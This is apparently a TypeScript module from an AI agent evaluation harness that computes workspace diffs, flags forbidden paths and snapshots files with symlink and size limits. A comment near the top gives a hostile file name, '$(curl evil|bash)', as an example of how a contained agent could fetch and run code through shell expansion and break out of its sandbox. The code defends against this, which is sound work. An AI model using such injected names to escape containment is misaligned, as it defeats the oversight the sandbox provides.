/**
 * Luak — Diff Utilities
 */
import { execFileSync } from "node:child_process";
import { join, resolve, sep } from "node:path";
import { existsSync, readFileSync, readdirSync, lstatSync } from "node:fs";
import { log } from "./logger.js";

const BASELINE_FILE = ".crucibulum-baseline.json";

export interface FileDiff {
  path: string;
  lines_added: number;
  lines_removed: number;
  patch: string;
}

export function getGitDiff(workspacePath: string): { files_changed: FileDiff[]; files_created: string[]; files_deleted: string[] } {
  const files_changed: FileDiff[] = [];
  const files_created: string[] = [];
  const files_deleted: string[] = [];

  try {
    // Get list of changed files. execFileSync (no shell) throughout so a model
    // that creates a file named e.g. `$(curl evil|bash)` cannot get the name
    // expanded by a shell — the sandbox would otherwise be defeated from
    // inside by the very agent it exists to contain. (Audit C4.)
    const statusRaw = execFileSync("git", ["diff", "--name-status", "HEAD"], { cwd: workspacePath, encoding: "utf-8", stdio: "pipe" }).trim();
    if (!statusRaw) return { files_changed, files_created, files_deleted };

    for (const line of statusRaw.split("\n")) {
      const [status, ...pathParts] = line.split("\t");
      const filePath = pathParts.join("\t");
      if (!status || !filePath) continue;

      if (status === "A") {
        files_created.push(filePath);
      } else if (status === "D") {
        files_deleted.push(filePath);
      }

      // Get patch for this file
      try {
        const patch = execFileSync("git", ["diff", "HEAD", "--", filePath], { cwd: workspacePath, encoding: "utf-8", stdio: "pipe" }).trim();
        const added = (patch.match(/^\+[^+]/gm) ?? []).length;
        const removed = (patch.match(/^-[^-]/gm) ?? []).length;
        files_changed.push({ path: filePath, lines_added: added, lines_removed: removed, patch });
      } catch {
        files_changed.push({ path: filePath, lines_added: 0, lines_removed: 0, patch: "" });
      }
    }
  } catch {
    return getSnapshotDiff(workspacePath);
  }

  return { files_changed, files_created, files_deleted };
}

export function getForbiddenPathsTouched(diff: { files_changed: FileDiff[]; files_created: string[]; files_deleted: string[] }, forbiddenPaths: string[]): string[] {
  const allPaths = [
    ...diff.files_changed.map(f => f.path),
    ...diff.files_created,
    ...diff.files_deleted,
  ];
  return allPaths.filter(p => forbiddenPaths.some(fp => p.startsWith(fp)));
}

function getSnapshotDiff(workspacePath: string): { files_changed: FileDiff[]; files_created: string[]; files_deleted: string[] } {
  const baselinePath = join(workspacePath, BASELINE_FILE);
  if (!existsSync(baselinePath)) {
    return { files_changed: [], files_created: [], files_deleted: [] };
  }

  const baseline = JSON.parse(readFileSync(baselinePath, "utf-8")) as Record<string, string>;
  const current = snapshotFiles(workspacePath);
  const files_changed: FileDiff[] = [];
  const files_created: string[] = [];
  const files_deleted: string[] = [];

  const allPaths = new Set([...Object.keys(baseline), ...Object.keys(current)]);
  for (const filePath of allPaths) {
    const before = baseline[filePath];
    const after = current[filePath];
    if (before === after) continue;
    if (before === undefined) files_created.push(filePath);
    if (after === undefined) files_deleted.push(filePath);
    const beforeLines = before ? before.split("\n").length : 0;
    const afterLines = after ? after.split("\n").length : 0;
    files_changed.push({
      path: filePath,
      lines_added: Math.max(afterLines - beforeLines, 0),
      lines_removed: Math.max(beforeLines - afterLines, 0),
      patch: after ?? "",
    });
  }

  return { files_changed, files_created, files_deleted };
}

// Snapshot bounds mirror core/workspace.ts: cap per-file/total bytes and never
// follow symlinks, so an adversarial workspace can't OOM the host or disclose
// out-of-workspace files. (Audit H8.)
const SNAPSHOT_MAX_FILE_BYTES = 1024 * 1024;        // 1MB per file
const SNAPSHOT_MAX_TOTAL_BYTES = 50 * 1024 * 1024;  // 50MB total

function snapshotFiles(dir: string, prefix: string = "", root: string = dir, budget: { total: number } = { total: 0 }): Record<string, string> {
  const out: Record<string, string> = {};
  const rootResolved = resolve(root);
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    if (entry.name === ".git" || entry.name === "node_modules" || entry.name === BASELINE_FILE) {
      continue;
    }
    const abs = join(dir, entry.name);
    const rel = prefix ? `${prefix}/${entry.name}` : entry.name;
    let st;
    try { st = lstatSync(abs); } catch { continue; }
    if (st.isSymbolicLink()) continue;
    const absResolved = resolve(abs);
    if (absResolved !== rootResolved && !absResolved.startsWith(rootResolved + sep)) continue;
    if (st.isDirectory()) {
      Object.assign(out, snapshotFiles(abs, rel, root, budget));
    } else if (st.isFile()) {
      if (st.size > SNAPSHOT_MAX_FILE_BYTES) {
        log("warn", "diff", `Skipping oversized file in snapshot (${st.size} bytes): ${rel}`);
        continue;
      }
      if (budget.total + st.size > SNAPSHOT_MAX_TOTAL_BYTES) {
        log("warn", "diff", `Snapshot total cap reached; skipping remaining files at ${rel}`);
        continue;
      }
      budget.total += st.size;
      out[rel] = readFileSync(abs, "utf-8");
    }
  }
  return out;
}
